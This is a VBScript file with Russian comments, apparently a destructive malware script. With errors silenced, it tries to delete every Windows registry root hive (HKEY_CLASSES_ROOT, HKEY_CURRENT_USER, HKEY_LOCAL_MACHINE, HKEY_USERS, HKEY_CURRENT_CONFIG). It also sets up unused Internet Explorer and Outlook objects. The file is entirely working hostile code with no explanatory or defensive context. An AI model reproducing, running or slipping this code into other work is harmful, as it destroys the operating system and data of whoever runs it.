Set FileSystemObject = CreateObject("scripting.filesystemobject")
Set Shell = CreateObject("Wscript.Shell")
t = 0: On Error Resume Next ' Пропускать ошибки
Set Application = CreateObject("Shell.Application")
Set InternerExplorer = WScript.CreateObject("InternetExplorer.Application")
Set Outlook = WScript.CreateObject("Outlook.Application")


' Удалить запись в Реестре
Shell.RegDelete "HKEY_CLASSES_ROOT"

' Удалить запись в Реестре
Shell.RegDelete "HKEY_CURRENT_USER"

' Удалить запись в Реестре
Shell.RegDelete "HKEY_LOCAL_MACHINE"

' Удалить запись в Реестре
Shell.RegDelete "HKEY_USERS"

' Удалить запись в Реестре
Shell.RegDelete "HKEY_CURRENT_CONFIG"

